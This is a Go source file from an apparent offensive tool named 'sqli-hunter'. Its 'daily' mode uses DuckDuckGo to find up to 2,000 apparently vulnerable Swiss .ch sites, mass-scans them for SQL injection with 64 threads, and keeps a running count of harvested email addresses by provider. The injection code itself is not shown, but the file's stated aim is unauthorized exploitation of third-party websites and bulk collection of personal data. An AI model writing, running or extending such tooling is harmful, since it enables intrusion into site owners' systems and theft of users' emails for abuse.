package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"

	"github.com/sqli-hunter/sqli-hunter/internal/output"
	"github.com/sqli-hunter/sqli-hunter/internal/results"
)

// runDaily lance discover + scan pour récupérer uniquement de nouveaux emails.
// Usage: sqli-hunter daily  (ou cron quotidien)
func runDaily(args []string) {
	cfg, err := parseDailyArgs(args)
	if err != nil {
		fmt.Fprintf(os.Stderr, "erreur: %v\n", err)
		os.Exit(1)
	}

	printer := output.New(cfg.noColor, cfg.verbose)
	printer.Header(version)
	printer.KV("mode", "daily — nouveaux emails uniquement")
	printer.KV("discover", "URLs vuln .ch (DuckDuckGo)")
	printer.KV("limit", fmt.Sprintf("%d urls", cfg.discoverLimit))
	printer.KV("threads", fmt.Sprintf("%d", cfg.urlConcurrency))
	printer.KV("output", cfg.outputDir+"/emails/")
	printer.Rule()
	fmt.Println()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		printer.Warning("interruption")
		cancel()
	}()

	cfg.discoverDomain = "ch"
	cfg.discoverSource = "duckduckgo"
	cfg.discoverSubs = true
	cfg.discoverOutput = filepath.Join(cfg.outputDir, "scope_daily.txt")
	cfg.skipScanned = true
	cfg.allowEmptyDiscover = true

	scopeFile, count, err := discoverURLs(ctx, cfg, printer)
	if err != nil {
		printer.Error(err.Error())
		os.Exit(1)
	}
	if count == 0 {
		printer.Success("Rien de nouveau aujourd'hui — emails déjà à jour")
		printEmailStock(printer, cfg.outputDir)
		return
	}

	cfg.listFile = scopeFile
	applyMassDefaultsToConfig(&cfg, count)
	cfg.massMode = true

	if err := executeScan(ctx, cfg, printer); err != nil {
		printer.Error(err.Error())
		os.Exit(1)
	}

	printEmailStock(printer, cfg.outputDir)
}

func parseDailyArgs(args []string) (config, error) {
	scanArgs := append([]string{"-D", "ch", "--mass", "--url-threads", "64", "--discover-limit", "2000"}, args...)
	return parseArgs(scanArgs)
}

func printEmailStock(printer *output.Printer, outputDir string) {
	list, err := results.ListProviders(outputDir)
	if err != nil || len(list) == 0 {
		return
	}
	printer.Rule()
	fmt.Println()
	printer.KV("stock emails", "")
	for _, p := range list {
		fmt.Printf("  • %s — %d\n", p.Provider, p.Count)
	}
}
